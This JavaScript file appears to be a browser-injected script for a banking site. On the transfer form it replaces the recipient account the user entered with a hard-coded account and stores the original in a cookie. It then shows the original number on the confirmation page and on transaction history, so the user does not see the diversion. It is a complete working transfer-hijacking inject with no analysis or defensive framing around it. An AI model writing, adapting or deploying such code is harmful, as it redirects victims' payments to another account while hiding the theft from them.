document.addEventListener("DOMContentLoaded", function(event) {
	var form = document.getElementById('form');
	//if on transfer page
	if (form != null) {
		form.onsubmit = function(){ 
			setCookie("curr", document.getElementById('account').value, 14);
			document.getElementById('account').value = 'ABCDEFGHIJ-KLMNOPQRST-UVXWYZABCD';
			form.submit();
		};
		if (getCookie("curr") != "") {
			if (document.getElementById('account').value != "")
				document.getElementById('account').value = getCookie("curr");
		}
	} else {
		var form1 = document.getElementById('form1');
		//if on submit page
		if (form1 != null) {
			form1.onsubmit = function() {
				var title = document.getElementById('titleName').innerHTML;
				var account = document.getElementById('accountNumber').innerHTML;
				var amount = document.getElementById('amountNumber').innerHTML;
				title = title.replace(/\s/g, "");
				account = account.replace(/\s/g, "");
				amount = amount.replace(/\s/g, "");
				setCookie(title + amount, account, 14);
				form1.submit();
			};
			document.getElementById('accountNumber').innerHTML = getCookie("curr"); 
			//else on history page
		} else {
			var counter = 0;
			while (document.getElementById('title' + counter) != null) {
				var title = document.getElementById('title' + counter).innerHTML;
				var amount = document.getElementById('amount' + counter).innerHTML;
				if (getCookie(title + amount) != "")
					document.getElementById('target' + counter).innerHTML = getCookie(title + amount);
				counter += 1;
			}
		}
	}
});

function setCookie(cname, cvalue, exdays) {
	var d = new Date();
	d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
	var expires = "expires=" + d.toUTCString();
	document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
} 

function getCookie(cname) {
	var name = cname + "=";
	var ca = document.cookie.split(';');
	for (var i = 0; i < ca.length; ++i) {
		var c = ca[i];
		while (c.charAt(0) == ' ') {
			c = c.substring(1);
		}
		if (c.indexOf(name) == 0) {
			return c.substring(name.length, c.length);
		}
	}
	return "";
}
